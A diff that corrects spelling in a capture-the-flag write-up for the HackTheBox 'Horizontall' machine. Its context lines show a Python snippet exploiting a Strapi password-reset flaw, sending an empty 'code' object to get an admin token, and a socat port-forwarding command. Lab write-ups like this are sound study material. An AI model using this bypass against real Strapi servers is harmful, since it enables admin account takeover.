@@ -23,7 +23,7 @@ Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
 
 * http Server redirect to `horizontall.htb` 
 
-found another subdoamin from burp site-map
+found another subdomain from burp site-map
 
 ![](screenshots/site-map.png)
 
@@ -76,7 +76,7 @@ Affected versions of this package are vulnerable to Improper Access Control. It 
 
 From fixed commit we can see that The issue was a lack of validation of the code parameter sent by the user: https://github.com/strapi/strapi/pull/4443/commits/e0424d4b880831dd643afff9c6ba475acdbae0be
 
-Found reset passowrd request parameter from [`packages/strapi-admin/controllers/Auth.js`](https://github.com/strapi/strapi/blob/7a61db72851d3ddf3fef172b47100737eb075ceb/packages/strapi-admin/controllers/Auth.js#L206)
+Found reset password request parameter from [`packages/strapi-admin/controllers/Auth.js`](https://github.com/strapi/strapi/blob/7a61db72851d3ddf3fef172b47100737eb075ceb/packages/strapi-admin/controllers/Auth.js#L206)
 
 ![](screenshots/reset-params.png)
 
@@ -86,7 +86,7 @@ Sending crafted data in the POST request to `/admin/auth/reset-password`
 
 And get admin user auth token.
 
-Now we can login as admin with new reset passowrd
+Now we can login as admin with new reset password
 
 ![](screenshots/admin-logedin.png)
 
@@ -109,7 +109,7 @@ s = r.Session()
 # s.proxies = {'http': 'localhost:8080'}
 url = 'http://api-prod.horizontall.htb'
 
-# Send Reset passowrd request to retrieve admin jwt token
+# Send Reset password request to retrieve admin jwt token
 reset_data = {"code": {}, "password": "p00rduck", "passwordConfirmation": "p00rduck"}
 rspn = s.post(f"{url}/admin/auth/reset-password", json=reset_data)
 json_pars = json.loads(rspn.content.decode())
@@ -141,8 +141,8 @@ LISTEN   0         128               127.0.0.1:8000             0.0.0.0:*
 LISTEN   0         80                127.0.0.1:3306             0.0.0.0:* 
 ```
 
-* Port 8000 is running **`Laravel v8 (PHP v7.4.18)`** fround with `curl`.
-* Formward port 8000 with socat `./socat tcp-l:8001,fork,reuseaddr tcp:127.0.0.1:8000 &`.
+* Port 8000 is running **`Laravel v8 (PHP v7.4.18)`** found with `curl`.
+* Froward port 8000 with socat `./socat tcp-l:8001,fork,reuseaddr tcp:127.0.0.1:8000 &`.
 
 Now we can access to local port 8000 from remote port 8001.
 
